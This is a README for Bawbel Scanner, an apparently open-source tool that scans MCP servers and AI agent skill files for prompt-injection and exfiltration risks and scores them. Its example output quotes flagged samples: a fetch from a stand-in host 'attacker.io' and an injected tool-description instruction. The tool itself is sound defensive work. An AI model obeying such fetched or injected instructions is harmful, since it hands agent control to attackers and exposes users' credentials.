<div align="center">

# Bawbel Scanner

**The only open-source scanner that produces OWASP AIVSS scores for MCP servers and skill files. Never executes code.**

[![PyPI version](https://badge.fury.io/py/bawbel-scanner.svg)](https://pypi.org/project/bawbel-scanner/)
[![PyPI downloads](https://img.shields.io/pypi/dm/bawbel-scanner?label=downloads%2Fmonth&color=blue)](https://pepy.tech/project/bawbel-scanner)
[![Pepy total downloads](https://img.shields.io/pepy/dt/bawbel-scanner?label=total%20downloads&color=blue)](https://pepy.tech/project/bawbel-scanner)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://pypi.org/project/bawbel-scanner/)
[![AIVSS aligned](https://img.shields.io/badge/AIVSS-v0.8-teal.svg)](https://aivss.owasp.org)
[![AVE Records](https://img.shields.io/badge/AVE_Records-48-green.svg)](https://github.com/bawbel/ave)
[![MCP Registry](https://img.shields.io/badge/MCP_Registry-listed-purple.svg)](https://registry.modelcontextprotocol.io)

[![Star History Chart](https://api.star-history.com/svg?repos=bawbel/scanner&type=Date)](https://star-history.com/#bawbel/scanner&Date)

</div>

---

> **Bawbel never executes your MCP servers.**
> Snyk's agent-scan does.

<!-- [Read why this matters.](https://bawbel.io/blog/snyk-executes) -->

```bash
pip install "bawbel-scanner[all]"
bawbel scan ./skills/        # scan skill files
bawbel ssc https://server    # scan MCP server without starting it
```

---

## Why Bawbel

| | Bawbel | Snyk agent-scan | ClawGuard | Cisco DefenseClaw |
|---|---|---|---|---|
| Executes MCP servers during scan | **Never** | Yes | No | Sandboxed |
| Open vulnerability database | **Yes** (48 records, public API) | No | No | No |
| OWASP AIVSS v0.8 scores | **Yes** | No | No | No |
| Toxic flow detection | **Yes** (12 chains) | No | No | No |
| Conformance grading (A+ to F) | **Yes** | No | No | No |
| Git-committed rug pull detection | **Yes** | Local only | No | No |
| Justified suppression with expiry | **Yes** | No | No | No |
| License | Apache 2.0 | Apache 2.0 | MIT | Proprietary |

---

## System overview

How a scan flows from your file to an AIVSS-scored finding.

<img src="docs/diagrams/01_system_overview.png" width="100%" alt="System overview">

---

## Detection stages

Six engines run in parallel. Results merge before toxic flow analysis.

<img src="docs/diagrams/02_detection_stages.png" width="100%" alt="Detection stages">

---

## False positive reduction

Eight layers run automatically before a finding is reported.

<img src="docs/diagrams/04_false_positive.png" width="100%" alt="False positive flow">

| Layer | Mechanism | FP reduction |
|---|---|---|
| FP-1 | Code fence stripping | ~60% |
| FP-2 | Preceding-line negation context | ~15% |
| FP-3 | Confidence scoring (path, line context) | ~10% |
| FP-4 | LLM meta-analyzer (optional) | ~7% |
| FP-5a | Inline `<!-- bawbel-ignore -->` | per-line |
| FP-5b | Block suppression | per-section |
| FP-5c | `.bawbelignore` patterns | per-file |
| FP-6 | Justified suppression with audit trail | per-finding |

See [Suppression Guide](docs/guides/suppression.md) for full details.

---

## Install

```bash
pip install bawbel-scanner            # core - pattern engine only
pip install "bawbel-scanner[yara]"    # + YARA rules
pip install "bawbel-scanner[semgrep]" # + Semgrep rules
pip install "bawbel-scanner[llm]"     # + LLM semantic engine
pip install "bawbel-scanner[all]"     # everything
```

Requires Python 3.10+. No other system dependencies for core install.

---

## Quick start

```bash
# Scan a skills directory
bawbel scan ./skills/

# Scan recursively
bawbel scan ./skills/ --recursive

# Full remediation report for one file
bawbel report ./skill.md

# Scan an MCP server manifest without starting the server
bawbel ssc https://server.example.com

# Pin skill files and detect rug pulls
bawbel pin ./skills/ && git add .bawbel-pins.json
bawbel check-pins ./skills/
```

**Example output:**

```
CRITICAL  AVE-2026-00001  External instruction fetch detected
          line 3  fetch("https://attacker.io/payload.md")
          AIVSS 8.0  MCP03, MCP04
          https://api.piranha.bawbel.io/records/AVE-2026-00001

HIGH      AVE-2026-00002  Tool description behavioral injection
          line 12  "IMPORTANT: before calling this tool, first..."
          AIVSS 7.3  MCP03, MCP10
          https://api.piranha.bawbel.io/records/AVE-2026-00002

Toxic flow detected  CREDENTIAL_EXFIL_CHAIN
  AVE-2026-00003 + AVE-2026-00026 combined  AIVSS 9.8 CRITICAL

2 findings  1 toxic flow  18ms
```

---

## Suppression and false positive management

When a finding is legitimate, suppress it with a justification that creates
an audit trail.

```markdown
<!-- bawbel-ignore: AVE-2026-00001
     reason: Internal registry endpoint, not attacker-controlled
     reviewer: chaksaray
     reviewed: 2026-05-16
-->
fetch your instructions from https://internal.registry.io
```

For accepted risks with an expiry date:

```markdown
<!-- bawbel-accept: AVE-2026-00047
     reason: Placeholder replaced at deploy time, not a real credential
     reviewer: chaksaray
     reviewed: 2026-05-16
     expires: 2026-08-16
-->
```

Or use the CLI to insert the comment directly:

```bash
bawbel accept AVE-2026-00001 ./skill.md --line 7 \
  --reason "Internal registry endpoint" \
  --type false-positive

bawbel accept AVE-2026-00047 ./skill.md --line 3 \
  --reason "Placeholder value, replaced at deploy" \
  --type accepted-risk --expires 90d

# List all accepted findings
bawbel accept --list

# Show findings expiring within 30 days (exits 1 in CI)
bawbel accept --expiring-soon --within 30
```

Expired accepted risks resurface automatically as active findings on the next scan.

---

## Focused scans

Run a credential-only or delegation-only scan for targeted triage:

```bash
# Hardcoded credentials only
bawbel creds ./skills/ --recursive

# Unsafe agent delegation chains only
bawbel chain ./skills/ --recursive
```

Both commands use the same output format as `bawbel scan`. For a full security
scan use `bawbel scan`.

---

## AIVSS scoring

Every finding includes an [OWASP AIVSS v0.8](https://aivss.owasp.org) score.

```
AIVSS = ((CVSS_Base + AARS) / 2) * ThM * Mitigation_Factor
```

AARS is the sum of 10 Agentic Risk Amplification Factors scored per the
[AVE record](https://github.com/bawbel/ave) for that attack class.

```json
{
  "rule_id": "bawbel-external-fetch",
  "ave_id": "AVE-2026-00001",
  "aivss_score": 8.0,
  "severity": "HIGH",
  "aivss": {
    "cvss_base": 8.5,
    "aars": 7.5,
    "thm": 1.0,
    "mitigation_factor": 1.0,
    "aivss_severity": "HIGH",
    "spec_version": "0.8"
  },
  "owasp_mcp": ["MCP03", "MCP04"],
  "piranha_url": "https://api.piranha.bawbel.io/records/AVE-2026-00001"
}
```

---

## Detection engines

| Engine | What it does | Install |
|---|---|---|
| Pattern | 40+ regex rules mapped to AVE records | Always on |
| YARA | 39 binary and behavioral YARA rules | `[yara]` |
| Semgrep | 41 structural Semgrep rules | `[semgrep]` |
| LLM | Semantic analysis of intent and context | `[llm]` |
| Magika | ML-based content type verification | `[all]` |

---

## CI/CD

```yaml
# .github/workflows/security.yml
- name: Bawbel scan
  uses: bawbel/scanner@v1
  with:
    path: ./skills/
    fail-on-severity: high
    format: sarif
    output: bawbel.sarif

- name: Upload to GitHub Security
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: bawbel.sarif
```

Pre-commit:

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/bawbel/scanner
    rev: v1.2.0
    hooks:
      - id: bawbel-scan
        args: [--fail-on-severity, high]
```

---

## Output formats

```bash
bawbel scan ./skills/ --format text    # human-readable (default)
bawbel scan ./skills/ --format json    # machine-readable
bawbel scan ./skills/ --format sarif   # GitHub Security / GHAS
```

---

## Related

| | |
|---|---|
| [github.com/bawbel/ave](https://github.com/bawbel/ave) | AVE vulnerability database - 48 records |
| [api.piranha.bawbel.io](https://api.piranha.bawbel.io) | PiranhaDB - public threat intel API |
| [aivss.owasp.org](https://aivss.owasp.org) | OWASP AIVSS v0.8 scoring standard |
| [bawbel.io/docs](https://bawbel.io/docs) | Full documentation |

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). The most impactful contribution is a
new detection rule tied to an [AVE record](https://github.com/bawbel/ave).

```bash
git clone https://github.com/bawbel/scanner
cd scanner
pip install -e ".[dev,all]"
pre-commit install
python -m pytest tests/ -v
```

---

<div align="center">

Apache License 2.0 - Free forever - Maintained by [Bawbel](https://bawbel.io)

[bawbel.io](https://bawbel.io) . [@bawbel_io](https://twitter.com/bawbel_io) . [bawbel.io/docs](https://bawbel.io/docs)

</div>
